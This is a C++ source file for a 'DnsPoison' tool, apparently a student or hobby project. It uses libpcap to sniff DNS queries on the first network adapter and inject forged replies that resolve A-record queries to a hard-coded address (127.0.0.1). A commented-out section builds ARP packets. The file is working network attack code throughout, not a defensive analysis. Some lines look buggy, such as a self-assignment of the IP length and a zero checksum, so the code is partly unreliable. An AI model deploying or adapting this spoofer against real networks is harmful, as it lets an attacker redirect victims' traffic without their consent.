#include "DnsPoison.h"


struct EthHeader {
	uint8_t dest[6];
	uint8_t src[6];
	uint16_t ethertype;
};

struct IpHeader {
	uint8_t ihl;
	uint8_t tos;
	uint16_t len;
	uint16_t frag_id;
	uint8_t frag_offs;
	uint8_t ttl;
	uint8_t proto;
	uint8_t chksm[2];
	uint8_t src[4];
	uint8_t dest[4];
};
struct UdpHeader {
	uint8_t srcprt[2];
	uint8_t destprt[2];
	uint8_t len[2];
	uint8_t chksm[2];
};

struct DnsRequest {
	uint8_t transID[2];
	uint8_t flags[2];
	uint8_t question[2];
	uint8_t answerRR[2];
	uint8_t authorityRR[2];
	uint8_t addintionalRR[2];
	char query[];

};
struct DnsAnswer {
	uint8_t transID[2];
	uint8_t flags[2];
	uint8_t question[2];
	uint8_t answerRR[2];
	uint8_t authorityRR[2];
	uint8_t addintionalRR[2]; 
	char queryandanswer[100];
};

int DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
	
	EthHeader *eth1 = (EthHeader *)packet;
	IpHeader *ip1 = (IpHeader *)(packet + sizeof(EthHeader));
	UdpHeader *udp1 = (UdpHeader *)(packet + sizeof(EthHeader) + sizeof(IpHeader));
	DnsRequest *dnsa1 = (DnsRequest *)(packet + sizeof(EthHeader) + sizeof(IpHeader) + sizeof(UdpHeader));
	
	EthHeader *eth2 = (EthHeader *)dnsspoofpacket;
	IpHeader *ip2 = (IpHeader *)(dnsspoofpacket + sizeof(EthHeader));
	UdpHeader *udp2 = (UdpHeader *)(dnsspoofpacket + sizeof(EthHeader) + sizeof(IpHeader));
	DnsAnswer *dnsa2 = (DnsAnswer *)(dnsspoofpacket + sizeof(EthHeader) + sizeof(IpHeader) + sizeof(UdpHeader));

	//print_payload(dnsspoofpacket, 100);

	memcpy(eth2->dest, eth1->src, 6);
	memcpy(eth2->src, eth1->dest, 6);

	//print_payload(dnsspoofpacket, 100);

	eth2->ethertype = eth1->ethertype;
	ip2->ihl = ip1->ihl;
	ip2->tos = ip1->tos;
	ip2->len = ip2->len;
	ip2->frag_id = ip1->frag_id,
	ip2->frag_offs = ip1->frag_offs;
	ip2->ttl=  ip1->ttl ;
	ip2->proto=ip1->proto ;
	memcpy(ip2->chksm,"\x00\x00",2);
	//print_payload(dnsspoofpacket, 100);

	memcpy(ip2->dest, ip1->src, 4);
	memcpy(ip2->src, ip1->dest, 4);
	//print_payload(dnsspoofpacket, 100);
	memcpy(udp2->destprt, udp1->srcprt, 2);
	memcpy(udp2->srcprt, udp1->destprt, 2);

	//print_payload(dnsspoofpacket, 100);
	// len and checksum for the end
	memcpy(udp2->len, udp1->len, 2);
	// copy dns request without name
	memcpy(dnsa2, dnsa1, sizeof(DnsRequest) - 4);
	int ql = strlen(dnsa1->query)+1;
	memcpy(dnsa2->queryandanswer, dnsa1->query, ql);
	memcpy((dnsa2->queryandanswer) + ql, "\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x08\x00\x04\x7F\x00\x00\x01", 20);
	return ql;
}
void DnsPoison::dothepoisoning(const uint8_t *packet,DnsRequest* check)
{
	pcap_t * handle1;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[8];	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	u_char *user;
	pcap_if_t * allAdapters;

	int error = pcap_findalldevs(&allAdapters, errbuf);

	dev = allAdapters->name;
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle1 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle1 == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return;
	}
	uint8_t dnsspoofpacket[256];
	int querylegnth = fill_dns_packet(dnsspoofpacket, packet);

	printf("print query\n");
	print_payload(packet, 74);
	printf("print answer\n");
	print_payload(dnsspoofpacket, 74 + 20);
	if (pcap_sendpacket(handle1, (const u_char*)dnsspoofpacket, 74+20-4) != 0) {
				fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle1));
				return;
	}
}

//void DnsPoison::fill_dns_packet(uint8_t dns_spoof_victim[], std::string victimip, std::string serverip, std::string urltopoison)
//{
//}

//void DnsPoison::fill_dns_packet(uint8_t dns_spoof_victim[], std::string victimip, std::string serverip, std::string urltopoison,
//	const uint8_t *victim_mac, const uint8_t *my_ip, const uint8_t *my_mac)
//{
//	EthHeader *eth = (EthHeader *)dns_spoof_victim;
//	IpHeader *ip = (IpHeader *)(dns_spoof_victim + sizeof(EthHeader));
//	UdpHeader *udp = (UdpHeader *)(dns_spoof_victim + sizeof(EthHeader) + sizeof(IpHeader));
//	DnsAnswer *dns = (DnsAnswer *)(dns_spoof_victim + sizeof(EthHeader) + sizeof(IpHeader) + sizeof(UdpHeader));
//
//	memcpy(eth->dest, victim_mac, 6);
//	memcpy(eth->src, my_mac, 6);
//	eth->ethertype = htons(0x0806);
//
//	arp->htype = htons(0x0001);
//	arp->ptype = htons(0x0800);
//	arp->hlen = 6;
//	arp->plen = 4;
//	arp->op = htons(1);		// arp request
//	memcpy(arp->sender_mac, my_mac, 6);
//	memcpy(arp->sender_ip, my_ip, 4);
//	memcpy(arp->target_mac, victim_mac, 6);
//	memcpy(arp->target_ip, victim_ip, 4);
//}

bool DnsPoison::resolve(const iface_info2& iface, const uint8_t ip[4], uint8_t mac[6]) {
	SOCKADDR_INET srcif;
	srcif.Ipv4.sin_family = AF_INET;
	memcpy(&srcif.Ipv4.sin_addr, iface.ip, 4);

	MIB_IPNET_ROW2 row = { 0 };
	row.InterfaceIndex = iface.ifIndex;
	row.Address.Ipv4.sin_family = AF_INET;
	memcpy(&row.Address.Ipv4.sin_addr, ip, 4);

	if (ResolveIpNetEntry2(&row, &srcif) != NO_ERROR) {
		return false;
	}
	if (row.State == NlnsReachable) {
		memcpy(mac, row.PhysicalAddress, 6);
		return true;
	}
	return false;
}
void DnsPoison::got_packet_dns(u_char * dumpfile, const pcap_pkthdr * header, const u_char * packet)
{
	translatePacketToPayload(packet);
}

//Capture code
int DnsPoison::Capture()
{
	/* find all the devices and use the first one*/
	int error = pcap_findalldevs(&allAdapters, errbuf);

	dev = allAdapters->name;
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", AMOUNT_TO_CAPTURE);
	printf("Filter expression: %s\n", filter_exp);
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	/* At this point, we no longer need the device list. Free it */
	pcap_freealldevs(allAdapters);

	/*
	start a loop fo capture. each packet sent to got_packet cllback function
	*/
	printf("start Capturing...\n");
	pcap_loop(handle, AMOUNT_TO_CAPTURE, got_packet_dns, (unsigned char *)user);
	printf("\nCapturing finished");
	/* And close the session */
	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);
	return(0);
}

void DnsPoison::translatePacketToPayload(const uint8_t * packet)
{
	const struct sniff_ethernet *ethernet; /* The ethernet header */
	const struct sniff_ip *ip; /* The IP header */
	const struct UdpHeader *udp; /* The TCP header */
	const u_char *dnspayload; /* Packet payload */

	u_int size_ip;
	u_int size_udp;

	ethernet = (struct sniff_ethernet*)(packet);
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip) * 4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	udp = (struct UdpHeader*)(packet + SIZE_ETHERNET + size_ip);
	size_udp = 8;
	dnspayload = (packet + SIZE_ETHERNET + size_ip + size_udp);
	print_payload(dnspayload, SIZE_ETHERNET + size_ip + size_udp);
	DnsRequest* check = (DnsRequest*)dnspayload;
	if (*(check->query + strlen(check->query)+ 2) == '\x1')
	{
		dothepoisoning(packet,check);
	}
}
void DnsPoison::print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for (;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

	return;
}
/*
* print data in rows of 16 bytes: offset   hex   ascii
*
* 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
*/
void DnsPoison::print_hex_ascii_line(const u_char * payload, int len, int offset)
{
	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);

	/* hex */
	ch = payload;
	for (i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");

	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");

	/* ascii (if printable) */
	ch = payload;
	for (i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

	return;
}

